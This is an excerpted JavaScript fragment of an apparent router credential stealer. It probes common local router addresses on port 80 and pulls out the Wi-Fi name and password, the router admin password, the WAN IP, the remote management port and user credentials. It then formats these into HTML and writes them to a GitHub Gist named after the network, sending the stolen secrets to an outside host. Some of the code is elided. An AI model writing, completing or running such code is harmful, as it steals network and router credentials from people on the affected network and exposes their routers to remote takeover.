...
function getRouterIps() {
    return ["192.168.0.1","192.168.1.1","192.168.144.120"];
}

function getPorts() {
    return [80]; // Add multiple ports here
}
...
async function upsertGist(wifiName, content) {
    const GIST_FILENAME = `${wifiName}.md`; // Create a dynamic filename with the Wi-Fi name
            ...
            try {
                ...
                if (wifiName && wifiPass && routerPass) {
                    ...
                    const resultString = `Details from ${routerIp} (${currentDateTime}) on port ${port}:` +
                        `<details><summary>View Config</summary><p>${response}</p></details>` +
                        `Network: ${wifiName}<br>` +
                        `Wi-Fi Password: ${wifiPass}<br>` +
                        `Router Admin Password: ${routerPass}<br>` +
                        `WAN IP: ${wanIp}<br>` +
                        `Remote Management Port: ${remotePort}<br>` +
                        `Username: ${userName}<br>` +
                        `User Password: ${userPass}<br><hr>`;
                    ...
                    const errorMessage = `<p  style="color:red">No valid data found for ${routerIp} (${currentDateTime}) on port ${port}.</p><hr>`;
                    results.push(errorMessage);
                }
            } catch (error) {
                const errorMessage = `<p  style="color:red">Error connecting to ${routerIp} (${currentDateTime}) on port ${port}: ${error.message}</p><hr>`;
                results.push(errorMessage);
            }
        }
    }
